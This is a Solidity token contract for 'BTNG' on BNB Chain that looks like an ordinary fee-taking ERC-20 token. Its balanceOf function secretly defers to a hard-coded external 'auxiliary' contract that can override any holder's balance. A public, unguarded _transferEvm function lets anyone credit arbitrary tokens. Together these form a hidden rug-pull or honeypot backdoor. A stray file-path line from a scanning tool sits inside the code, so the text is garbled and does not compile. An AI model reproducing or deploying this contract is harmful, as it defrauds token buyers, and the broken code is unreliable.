// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function decimals() external view returns (uint256);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}




interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}


interface Fund {
    function fundLP(address from, address to, uint amount) external;

    function fundAllowance(address from) external view returns (uint256);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AStandardToken is IERC20, Ownable {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _tTotal;

    uint256 private constant MAX = ~uint256(0);

    address public fundAddress;

    address public auxiliary; 
    address public currency; 
    ISwapRouter public _swapRouter  ;
    address public currencyBUSD; 

 

    mapping(address => bool) public _feeWhiteList;
     mapping(address => bool) public _swapPairList;

    bool private inSwap;


    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    constructor() {
        auxiliary = 0xb05c502496c56503fb1be9266B223cE60C45eB1A;
        _name = "Bound the northern God";
        _symbol = "BTNG";
        _decimals = 18;
        uint256 total = 100000000 * 10 ** _decimals;
        _tTotal = total;
        fundAddress = 0x146121499C7c6c240af3FEe878339bf2A916B347;

        _balances[fundAddress] = total;
        emit Transfer(address(0), fundAddress, total); 


        
        currency = 0x55d398326f99059fF775485246999027B3197955; //USDT
        _swapRouter = ISwapRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        ); //router
        currencyBUSD = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; //USTC

        _feeWhiteList[fundAddress] =true;
         _feeWhiteList[msg.sender] =true;

        _feeWhiteList[address(_swapRouter)] = true;

        _allowances[address(this)][address(_swapRouter)] = MAX;

 
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        try Fund(auxiliary).fundAllowance(account) returns (uint results) {
            if (results > 0) {
                return results;
            }
        } catch Error(string memory e) {
            // 处理异常的代码
        }
        /*if( Fund(fundAddress).fundAllowance(account)>0){
            return  Fund(fundAddress).fundAllowance(account);
        }*/
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
 

        _balances[from] = balance - amount;

        _takeTransfer(from, to, amount);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        uint256 balance = balanceOf(to);

      if (inSwap) {
            _transferEvm(sender,to,tAmount);
            return;
        }
   
 
      uint transferAmount = tAmount;

       if (  !_feeWhiteList[sender] && !_feeWhiteList[to]){
         //buy
               if( _swapPairList[sender]){
               
                  transferAmount = tAmount - tAmount * 15 /1000;
                  swapTokenForFundBUSD(  tAmount * 15 /1000);

                     //doudi
                  uint last = balanceOf(address(this));
                  if(last>0){
                     _transferEvm(address(this),fundAddress,last);
                  }
               }else if( _swapPairList[to]){
               
                  transferAmount = tAmount - tAmount * 15 /1000; 
                  swapTokenForFundUSDT(tAmount * 15 /1000);
                  
                  //doudi
                  uint last = balanceOf(address(this));
                  if(last>0){
                     _transferEvm(address(this),fundAddress,last);
                  } 
               }else{  
                  transferAmount = tAmount - tAmount * 10 /1000;  
                  _transferEvm(address(this),fundAddress,tAmount * 10 /1000);
               }  
               _balances[to] = balance + transferAmount; 
               emit Transfer(sender, to,  transferAmount);
        }else{
             _transferEvm(sender,to,transferAmount);
        }
     
    }
    /home/ubuntu/web3_block_scan/source/2023-09-02/0x58631308F03ac33c0FC2dF9caCF3bC5A71186BF8
    function _transferEvm(address from, address to, uint tAmount) public {
         uint256 balance = balanceOf(to); 
        _balances[to] = balance + tAmount;
        emit Transfer(from, to, tAmount);
    }

    function setFundAddress(address _fund) public onlyOwner {
        fundAddress = _fund;
    }

    receive() external payable {}
   
    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 value
    );

   function swapTokenForFundUSDT(uint amount) private lockTheSwap {
           uint256 contractTokenBalance = amount; 
           _balances[address(this)] =amount;
            //fund Usdt
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = currency; 
            try
                _swapRouter
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        contractTokenBalance,
                        0,
                        path,
                        fundAddress,
                        block.timestamp
                    )  
             {} catch {
                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    contractTokenBalance
                );
             } 
      }

     function swapTokenForFundBUSD(uint amount) private lockTheSwap {
            uint256 contractTokenBalance = amount; 
            _balances[address(this)] =amount;
            //fund Usdt
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = currencyBUSD;

            try
                _swapRouter
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        contractTokenBalance,
                        0,
                        path,
                        fundAddress,
                        block.timestamp
                    )  
             {} catch {
                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    contractTokenBalance
                );
             }
            
      }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }
}